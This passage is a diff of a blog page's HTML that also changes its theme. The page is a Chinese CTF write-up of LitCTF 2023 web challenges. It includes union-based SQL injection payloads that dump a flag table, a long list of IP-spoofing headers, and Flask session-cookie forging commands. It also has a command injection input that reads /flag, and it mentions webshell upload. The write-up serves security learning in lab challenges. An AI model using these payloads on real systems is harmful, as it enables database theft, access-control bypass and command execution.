+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name)<span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&quot;ctftraining&quot;</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>11.得到表明：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,news,users</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag,news,users<br></code></pre></td></tr></table></figure>
 
 <p>12.重新爆列：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;flag&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">group_concat</span>(column_name)<span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&quot;flag&quot;</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>13.获得列名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">flag</span><br></code></pre></td></tr></table></figure>
 
 <p>14.重新获取值：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(flag) <span class="keyword">from</span> ctftraining.flag<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">group_concat</span>(flag) <span class="hljs-keyword">from</span> ctftraining.flag<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2vs4use82qa0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2vs4use82qa0.webp" srcset="/img/loading.gif" lazyload></p>
 <h4 id="webshell：需要上传木马以及蚁剑的使用"><a href="#webshell：需要上传木马以及蚁剑的使用" class="headerlink" title="webshell：需要上传木马以及蚁剑的使用"></a>webshell：需要上传木马以及蚁剑的使用</h4><p>大马，小马，一句话木马等，上传后使用蚁剑进行连接</p>
 <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Wk4y1m7fp/?spm_id_from=333.337.search-card.all.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18">如何使用中国蚁剑连接webshell？_哔哩哔哩_bilibili</a></p>
 <h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p>和http请求头有关的题目，详细可以在下面的网站了解</p>
 <p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/web/http/headers">HTTP 标头（header） - HTTP | MDN (mozilla.org)</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Forwarded-For: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Forwarded: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Requested-With: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-Proto: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Forwarded-Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-remote-addr: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Real-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Ali-CDN-Real-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Src-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Cdn-Real-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">CF-Connecting-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Cluster-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">WL-Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Proxy-Client-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Fastly-Client-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">True-Client-Ip: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Originating-IP: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">X-Custom-IP-Authorization: <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">X-Forwarded: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Forwarded: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Requested-With: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Forwarded-Proto: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Forwarded-Host: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-remote-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-remote-addr: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>True-Client-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Client-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Client-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Real-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Ali-CDN-Real-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Cdn-Src-Ip: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Cdn-Real-Ip: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>CF-Connecting-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Cluster-Client-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>WL-Proxy-Client-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Proxy-Client-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>Fastly-Client-Ip: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>True-Client-Ip: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Originating-IP: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Host: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>X-Custom-IP-Authorization: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure>
 
 <p>本机地址client-ip: 127.0.0.1</p>
 <p>访问网站referer: pornhub.com</p>
 <p>指定浏览器user-agent: Chrome</p>
 <p>使用代理via: Clash.win</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.73yrqln52y00.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.73yrqln52y00.webp" srcset="/img/loading.gif" lazyload></p>
 <p>到达这个页面后，直接去源码查看就可以看到flag所在的地方</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xfl93ctnwu0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xfl93ctnwu0.webp" srcset="/img/loading.gif" lazyload></p>
 <h2 id="LitCTF-2023-1zjs"><a href="#LitCTF-2023-1zjs" class="headerlink" title="[LitCTF 2023]1zjs"></a>[LitCTF 2023]1zjs</h2><p>直接去源代码区域，找到js源码，可以发现一个php，里面有很多jsfuck的文字，直接去解密就行</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1rcn1dvd618g.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1rcn1dvd618g.webp" srcset="/img/loading.gif" lazyload></p>
 <p>因为是js，可以在控制台直接输出</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4yqn0mb2fi00.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4yqn0mb2fi00.webp" srcset="/img/loading.gif" lazyload></p>
 <h2 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h2><p>session伪造的题目</p>
 <p>我们可以先尝试输入文字然后回车，到后面获取flag，然后他提示我们需要管理员才能获取flag</p>
 <p>通过burp抓包我们可以看到有一段cookie被返回，题目的要求是只有管理员才能拿flag</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.61623zag7co0.png"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.61623zag7co0.png" srcset="/img/loading.gif" lazyload></p>
 <p>session伪造需要一个key，一般的题目中key是需要在题目中找的，但是这个题目的key是猜的，key&#x3D;’litctf’</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解码：python3  flask_session_cookie_manager3.py decode -s <span class="string">&quot;密钥&quot;</span> -c <span class="string">&quot;session&quot;</span></span><br><span class="line"></span><br><span class="line">加密：python3  flask_session_cookie_manager3.py encode -s <span class="string">&quot;密钥&quot;</span> -t <span class="string">&quot;上面解密出的一串字符串&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">解码：python3  flask_session_cookie_manager3.py decode -s <span class="hljs-string">&quot;密钥&quot;</span> -c <span class="hljs-string">&quot;session&quot;</span><br><br>加密：python3  flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;密钥&quot;</span> -t <span class="hljs-string">&quot;上面解密出的一串字符串&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>我们获取了key后可以先去解密一下，我们发现解密后他的请求name为’111’,根据题目我们修改成’admin’，就可以了</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.27nvnjo9nyo0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.27nvnjo9nyo0.webp" srcset="/img/loading.gif" lazyload></p>
 <p>我们使用burp发送过去就可以获得flag</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2eee9dgxxog0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2eee9dgxxog0.webp" srcset="/img/loading.gif" lazyload></p>
 <h2 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h2><p>我们首先可以看到源码，里面有个正则</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.64n0c8tf0240.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.64n0c8tf0240.webp" srcset="/img/loading.gif" lazyload></p>
 <p>所以我们有两个方式，第一个就是直接禁用JavaScript即可</p>
 <p>F12+F1 禁用后直接 1.1.1.1 || （ls &#x2F;）(cat &#x2F;flag) 即可</p>
 <p>同时这里就涉及了一个知识点就是linux的管道命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;</span><br><span class="line"></span><br><span class="line">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &#x27;1‘ &amp;&amp; echo &#x27;2&#x27;    </span><br><span class="line"></span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &#x27;yes&#x27; | wc -l</span><br><span class="line"></span><br><span class="line">|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;</span><br><br><span class="hljs-meta">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &#x27;1‘ &amp;&amp; echo &#x27;2&#x27;    </span><br><br><span class="hljs-string">| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &#x27;yes&#x27; | wc -l</span><br><br><span class="hljs-string">|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;</span>fail<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fx5n2h64yo0.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fx5n2h64yo0.webp" srcset="/img/loading.gif" lazyload></p>
 <p>第二个方法就是使用burp进行抓包，抓到后之间在内部进行修改</p>
-<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1g5mkbhr9g5c.webp"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1g5mkbhr9g5c.webp" srcset="/img/loading.gif" lazyload></p>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/RE/" class="print-no-link">#RE</a>
+      
+        <a href="/tags/litctf/" class="print-no-link">#litctf</a>
+      
+        <a href="/tags/WEB/" class="print-no-link">#WEB</a>
       
     </div>
-    
-  </div>
   
-    
-<nav id="article-nav">
-  
-    <a href="/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">&lt;</strong>
-      <div class="article-nav-title">
-        
-          web入门记录
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">山石结营赛</div>
-      <strong class="article-nav-caption">&gt;</strong>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-
-
-
-
 </div>
-      <footer id="footer">
-  <div class="outer">
-    <div id="footer-info">
-      <div class="footer-left">
-        &copy; 2024 wuming
-      </div>
-        <div class="footer-right">
-          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>litctf</div>
+      <div>https://wuming.github.io/2023/09/19/litctf/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>wuming</div>
         </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/" title="web入门记录">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">web入门记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/20/%E5%B1%B1%E7%9F%B3%E7%BB%93%E8%90%A5%E8%B5%9B/" title="山石结营赛">
+                        <span class="hidden-mobile">山石结营赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
     </div>
   </div>
-</footer>
-    </div>
-    
+</div>
+
+
+
+
+
   
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
 
 
 
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
 <script>
-	var yiliaConfig = {
-		fancybox: true,
-		mathjax: false,
-		animate: true,
-		isHome: false,
-		isPost: true,
-		isArchive: false,
-		isTag: false,
-		isCategory: false,
-		open_in_new: false
-	}
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
 </script>
 
-<script src="/js/main.js"></script>
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
-  </div>
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
